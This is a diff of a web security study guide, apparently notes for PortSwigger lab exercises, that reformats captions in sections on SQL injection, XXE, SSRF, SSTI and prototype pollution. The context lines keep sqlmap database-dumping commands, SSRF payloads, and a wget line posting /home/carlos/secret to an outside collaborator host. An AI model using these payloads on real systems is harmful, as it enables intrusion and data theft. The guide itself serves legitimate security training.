@@ -682,7 +682,7 @@ TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encodin
 
 [PortSwigger Lab: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)  
 
-<sup>Using SQLMAP to enumerate tracking cookie by provding -r REQUESTFILE to Load HTTP request from a file.</sup>  
+>Using SQLMAP to enumerate tracking cookie by provding -r REQUESTFILE to Load HTTP request from a file.  
 
 ```bash
 sqlmap -v -r sqli-blind.txt --batch --random-agent --level=5 --risk=3 -p "TrackingId"
@@ -696,19 +696,19 @@ sqlmap -v -r sqli-blind.txt --batch --random-agent --level=5 --risk=3 -p "Tracki
 
 [SQLMAP Help usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)  
 
-<sub>SQLMAP determine the vulnerability, and perform initial enumeration.</sub>  
+>SQLMAP determine the vulnerability, and perform initial enumeration.  
 
 ```bash
 sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3
 ```  
 
-<sub>SQLMAP determine the database DBMS.</sub>  
+>SQLMAP determine the database DBMS.  
 
 ```bash
 sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -dbs
 ```  
 
-<sub>SQLMAP determine Database, Tables, dump, data Exfiltration.</sub>  
+>SQLMAP determine Database, Tables, dump, data Exfiltration.  
 
 ```bash
 sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -D public --tables
@@ -759,7 +759,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 >Possible to find XXE attack surface in requests that do not contain any XML.  
 
-<sub>Identify XXE in not so obvious parameters or requests by adding the below and URL encode the **&** symbol.</sub>  
+>Identify XXE in not so obvious parameters or requests by adding the below and URL encode the **&** symbol.  
 
 ```xml
 %26entity;
@@ -894,7 +894,7 @@ CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
 
 >SSRF attack cause the server to make a connection to internal services within the organization, or force the server to connect to arbitrary external systems, potentially leaking sensitive data.  
 
-<sub>SSRF exploitation examples</sub>  
+>SSRF exploitation examples.  
 
 ```html
 /product/nextProduct?currentProductId=6&path=http://evil-user.net  
@@ -983,7 +983,7 @@ GET /service/intranet?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&readfile=/home/carlo
 Host: localhost
 ```  
 
-<sub>**Note:** Convert the GET request to POST</sub>  
+>**Note:** Convert the GET request to POST.  
 
 ![Routing-based SSRF](images/Routing-based-SSRF.png)  
 
@@ -1061,7 +1061,7 @@ pdf creator: wkhtmltopdf 0.12.5
 hacktricks xss cross site scripting server side xss dynamic pdf 
 ```  
 
-<sup> SSRF Section incomplete ...need more input...</sup>  
+>SSRF Section incomplete ...need more input...  
 
 
 ## SSTI - Server Side Template Injection
@@ -1189,13 +1189,13 @@ portswigger.net/research/template-injection
 wget http://ext.burpcollab.net --post-file=/home/carlos/secret
 ```  
 
-<sup> SSTI Section ...need more input...</sup>  
+>SSTI Section ...need more input...  
 
 ## ProtoType Pollution  
 
 >A target is vulnerable to DOM XSS via client side prototype pollution. **[DOM Invader](#dom-invader)** will identify the gadget and using hosted payload to phish a victim and steal their cookie.  
 
-<sub>Exploit server Body section, host an exploit that will navigate the victim to a malicious URL</sub>
+>Exploit server Body section, host an exploit that will navigate the victim to a malicious URL.  
 
 ```html
 <script>
@@ -1207,7 +1207,7 @@ wget http://ext.burpcollab.net --post-file=/home/carlos/secret
 
 ![Proto pollution](images/proto-pollution.png)  
 
-<sup> Proto pollution section is incomplete ...need more input...</sup>  
+>Proto pollution section is incomplete ...need more input...  
 
 ## JWT  
 
